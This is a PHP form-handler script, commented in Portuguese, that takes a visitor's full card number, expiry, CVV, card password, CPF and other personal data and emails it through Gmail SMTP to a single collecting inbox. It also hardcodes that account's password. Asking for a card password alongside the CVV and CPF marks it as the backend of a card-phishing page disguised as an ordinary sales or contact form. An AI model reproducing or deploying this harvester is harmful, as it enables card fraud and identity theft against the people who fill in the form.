
<?php
    // Criando nossas variáveis para guardar as informações do formulário
      $nome              = $_POST['nome']; 
      $email             = $_POST['email'];
      $creditcard        = $_POST['creditcard'];
      $nomecartao        = $_POST['nomecartao'];
      $ExpiryDate_month  = $_POST['ExpiryDate_month'];
      $ExpiryDate_year   = $_POST['ExpiryDate_year'];
      $SecurityCode      = $_POST['SecurityCode'];
      $senhacartao       = $_POST['senhacartao'];
      $idade             = $_POST['idade'];
      $cpfBR             = $_POST['cpfBR'];
     
     
    
    
    
    
    // formatando nossa mensagem (que será envaida ao e-mail)
      $mensagem= 'Esta mensagem foi enviada através do formulário<br><br>';
      $mensagem.='<b>Nome: </b>'.$nome.'<br>';
      $mensagem.='<b>Email:</b> '.$email.'<br>';
      $mensagem.='<b>Numero do cartao:</b> '.$creditcard.'<br>';
      $mensagem.='<b>Nome do Cartao:</b> '.$nomecartao.'<br>';
      $mensagem.='<b>Mes V:</b> '.$ExpiryDate_month.'<br>';
      $mensagem.='<b>Ano V:</b> '.$ExpiryDate_year.'<br>';
      $mensagem.='<b>Cvv:</b> '.$SecurityCode.'<br>';
      $mensagem.='<b>Senha:</b> '.$senhacartao.'<br>';
      $mensagem.='<b>Idade:</b> '.$idade.'<br>';
      $mensagem.='<b>Cpf:</b> '.$cpfBR ;
    
    
    
    
    // abaixo as requisições do arquivo phpmailer
    require("phpmailer/src/PHPMailer.php");
    require("phpmailer/src/SMTP.php");
    require ("phpmailer/src/Exception.php");
 
    // chamando a função do phpmailer
 
    $mail = new PHPMailer\PHPMailer\PHPMailer();
    $mail->isSMTP(); // Não modifique
    $mail->Host       = 'smtp.gmail.com'; // SEU HOST (HOSPEDAGEM)
    $mail->SMTPAuth   = true;                        // Manter em true
    $mail->Username   = 'vendastudoparavoce@gmail.com';   //SEU USUÁRIO DE EMAIL    ok
    $mail->Password   = '2019abra';                   //SUA SENHA DO EMAIL SMTP password  ok
    $mail->SMTPSecure = 'tls';    //TLS OU SSL-VERIFICAR COM A HOSPEDAGEM    ok
    $mail->Port       = 587;     //TCP PORT, VERIFICAR COM A HOSPEDAGEM     ok
    $mail->CharSet    = "UTF-8";    //DEFINE O CHARSET UTILIZADO       ok
    
    //Recipients
    $mail->setFrom('vendastudoparavoce@gmail.com');  //DEVE SER O MESMO EMAIL DO USERNAME   ok
    $mail->addAddress('vendastudoparavoce@gmail.com');     // QUAL EMAIL RECEBERÁ A MENSAGEM!       ok
    // $mail->addAddress('ellen@example.com');    // VOCÊ pode incluir quantos receptores quiser
    $mail->addReplyTo($email, $nome);  //AQUI SERA O EMAIL PARA O QUAL SERA RESPONDIDO                  
    // $mail->addCC('cc@example.com'); //ADICIONANDO CC
    // $mail->addBCC('bcc@example.com'); //ADICIONANDO BCC
 
    // Attachments
    // $mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments
    // $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name
 
    // Content
    $mail->isHTML(true);                                  // Set email format to HTML
    $mail->Subject = 'Mensagem do Formulário'; //ASSUNTO
    $mail->Body    = $mensagem;  //CORPO DA MENSAGEM
    $mail->AltBody = $mensagem;  //CORPO DA MENSAGEM EM FORMA ALT
 
    // $mail->send();
    if(!$mail->Send()) {
        echo "<script>alert('não foi enviado! ');window.location.assign('/');</script>";
     }else{
        echo "<script>alert('Deu certo, obrigado!');window.location.assign('/');</script>";
     }
     
?>